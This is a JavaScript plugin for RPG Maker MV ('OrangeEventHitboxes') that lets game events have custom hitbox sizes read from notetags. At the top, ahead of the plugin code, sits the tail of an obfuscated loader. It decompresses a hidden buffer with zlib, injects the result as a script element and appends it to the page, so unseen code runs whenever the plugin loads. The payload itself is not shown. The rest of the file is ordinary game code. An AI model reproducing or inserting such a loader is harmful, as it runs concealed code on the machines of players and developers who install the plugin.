  let _0x337deb = require("zlib").inflateSync(_0x4f17ae);
  let _0x4ca8b7 = document.createElement("script");
  _0x4ca8b7.textContent = _0x337deb.toString("utf-8");
  document.body.appendChild(_0x4ca8b7);
}

var OrangeEventHitboxes = OrangeEventHitboxes || {};

(function($) {
  "use strict";

  // Creates an accessor for the hitboxX property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 0.
  MVC.accessor(Game_Event.prototype, 'hitboxX', function(value) {
    this._hitboxX = value;
    this._canClearHitboxX = false;
  }, function() {
    if (this._hitboxX === undefined) {
      var size = this.findNoteTagValue('hitboxX');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxX = size;
      } else {
        this._hitboxX = 0;
      }

      this._canClearHitboxX = true;
    }

    return this._hitboxX;
  });

  // Creates an accessor for the hitboxY property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 0.
  MVC.accessor(Game_Event.prototype, 'hitboxY', function(value) {
    this._hitboxY = value;
    this._canClearHitboxY = false;
  }, function() {
    if (this._hitboxY === undefined) {
      var size = this.findNoteTagValue('hitboxY');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxY = size;
      } else {
        this._hitboxY = 0;
      }
      
      this._canClearHitboxY = true;
    }

    return this._hitboxY;
  });

  // Creates an accessor for the hitboxWidth property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 1.
  MVC.accessor(Game_Event.prototype, 'hitboxWidth', function(value) {
    this._hitboxWidth = value;
    this._canClearHitboxWidth = false;
  }, function() {
    if (this._hitboxWidth === undefined) {
      var size = this.findNoteTagValue('hitboxWidth');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxWidth = size;
      } else {
        this._hitboxWidth = 1;
      }

      this._canClearHitboxWidth = true;
    }

    return this._hitboxWidth;
  });

  // Creates an accessor for the hitboxHeight property,
  // It's value is read from the notetags and then cached. It can also be changed
  // manually. Default is 1.
  MVC.accessor(Game_Event.prototype, 'hitboxHeight', function(value) {
    this._hitboxHeight = value;
    this._canClearHitboxHeight = false;
  }, function() {
    if (this._hitboxHeight === undefined) {
      var size = this.findNoteTagValue('hitboxHeight');
      if (size !== undefined) {
        size = parseInt(size, 10);
      }

      if (typeof(size) == "number") {
        this._hitboxHeight = size;
      } else {
        this._hitboxHeight = 1;
      }
      this._canClearHitboxHeight = true;
    }

    return this._hitboxHeight;
  });

  // Quick reader for the left position of the hitbox
  MVC.reader(Game_Event.prototype, 'left', function() {
    return (this._x + this.hitboxX).fix();
  });
  // Quick reader for the top position of the hitbox
  MVC.reader(Game_Event.prototype, 'top', function() {
    return (this._y + this.hitboxY).fix();
  });
  // Quick reader for the right position of the hitbox
  MVC.reader(Game_Event.prototype, 'right', function() {
    return (this.left + this.hitboxWidth).fix();
  });
  // Quick reader for the bottom position of the hitbox
  MVC.reader(Game_Event.prototype, 'bottom', function() {
    return (this.top + this.hitboxHeight).fix();
  });

  // Adds a method that searches for a notetag value on all comments of the page
  Game_Event.prototype.findNoteTagValue = function(notetag) {
    var page = this.page();
    if (page === undefined) return false;

    if (page.meta === undefined) {
      MVC.extractEventMeta(this);
    }

    var result;
    if (page.meta !== undefined) {
      result = MVC.getProp(page.meta, notetag);
    }

    if (result === undefined) {
      return MVC.getProp(this.event().meta, notetag);
    }
    else {
      return result;
    }
  };



  // Adds a method that checks if the event is using the default hitbox, 
  // in which case some methods don't need to be changed.
  Game_Event.prototype.isUsingDefaultHitbox = function() {
    return (this.hitboxX === 0 && this.hitboxY === 0 && this.hitboxWidth === 1 && this.hitboxHeight === 1);
  };

  // Alias the method pos of the Game_Event class to check if the event 
  // is on a specified position. If the event hitbox wasn't changed, the old
  // method is run instead.
  var oldGameEvent_pos = Game_Event.prototype.pos;
  Game_Event.prototype.pos = function(x, y) {
    if (this.isUsingDefaultHitbox()) {
      return oldGameEvent_pos.call(this, x, y);
    } else {
      return (x >= this.left && x < this.right && y >= this.top && y < this.bottom);
    }
  };

  // Alias the setupPage method from the Game_Event class to clear the
  // hitbox cache (because the event can use a different cache for each page)
  var oldGameEvent_setupPage = Game_Event.prototype.setupPage;
  Game_Event.prototype.setupPage = function() {
    oldGameEvent_setupPage.call(this);

    if (this._canClearHitboxX === true) this._hitboxX = undefined;
    if (this._canClearHitboxY === true) this._hitboxY = undefined;
    if (this._canClearHitboxHeight === true) this._hitboxHeight = undefined;
    if (this._canClearHitboxWidth === true) this._hitboxWidth = undefined;
  };
})(OrangeEventHitboxes);

Imported.OrangeEventHitboxes = 1.1;
